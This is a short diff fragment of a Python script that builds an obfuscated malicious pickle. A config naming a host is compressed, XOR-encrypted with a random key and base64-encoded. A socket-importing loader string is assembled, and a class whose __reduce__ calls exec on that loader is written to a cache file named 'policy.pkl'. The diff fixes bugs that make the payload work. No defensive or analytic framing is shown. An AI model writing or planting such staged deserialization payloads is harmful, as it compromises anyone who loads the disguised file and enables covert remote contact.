@@ -36,7 +36,7 @@ nonce = secrets.token_hex(8)
 stage2 = 'host="%s"\nscheme="https"\nnonce="%s"\n' % (host, nonce)
 KEY = secrets.token_bytes(4)
 blob = base64.b64encode(
-    bytes(b ^ KEY[i % len(KEY)] for i, b in enumerate(zlib.compress(stage2.encode(), 9)))
+    bytes([b ^ KEY[i % len(KEY)] for i, b in enumerate(zlib.compress(stage2.encode(), 9))])
 ).decode()
 LOADER = ('import base64, zlib, socket\n'
           '_K = bytes.fromhex("%s")\n_D = "%s"\n'
@@ -50,7 +50,7 @@ LOADER = ('import base64, zlib, socket\n'
 
 class _Payload:
     def __reduce__(self):
-        return (exec, (LOADER,))
+        return (exec, (LOADER, {}))
 
 
 with open(os.path.join(CACHE, "policy.pkl"), "wb") as f:
